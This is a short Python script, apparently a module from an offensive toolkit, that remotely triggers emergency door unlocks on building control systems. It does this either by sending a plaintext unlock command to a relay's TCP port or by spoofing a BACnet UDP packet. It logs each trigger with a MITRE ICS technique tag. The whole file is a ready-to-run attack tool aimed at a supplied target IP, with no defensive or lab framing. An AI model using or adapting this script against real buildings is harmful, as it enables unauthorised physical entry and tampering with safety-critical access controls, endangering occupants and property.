#!/usr/bin/env python3
# modules/attacks/emergency_door_trigger.py

import argparse
import socket
import time
import json
import os
from datetime import datetime

LOG_FILE = "results/emergency_door_trigger.json"
MITRE_TTP = "T0851"

def log_trigger(target, method):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "method": method,
            "ttp": MITRE_TTP
        }) + "\n")

def send_relay_trigger(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.sendall(b'TRIGGER_EMERGENCY_UNLOCK\n')
        s.close()
        log_trigger(f"{ip}:{port}", "relay")
        print(f"[✓] Trigger sent to emergency door relay at {ip}:{port}")
    except Exception as e:
        print(f"[!] Failed to trigger relay: {e}")

def send_bacnet_trigger(ip):
    try:
        payload = b'\x81\x0a\x00\x0c\x01\x20\xff\xff\x00\x04\x00\x1c\x4f'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, 47808))
        s.close()
        log_trigger(ip, "bacnet")
        print(f"[✓] BACnet spoof sent to {ip}")
    except Exception as e:
        print(f"[!] BACnet spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger emergency door mechanisms remotely")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--method", choices=["relay", "bacnet"], required=True, help="Trigger method")
    parser.add_argument("--port", type=int, default=9999, help="Relay TCP port (default: 9999)")
    args = parser.parse_args()

    if args.method == "relay":
        send_relay_trigger(args.ip, args.port)
    else:
        send_bacnet_trigger(args.ip)
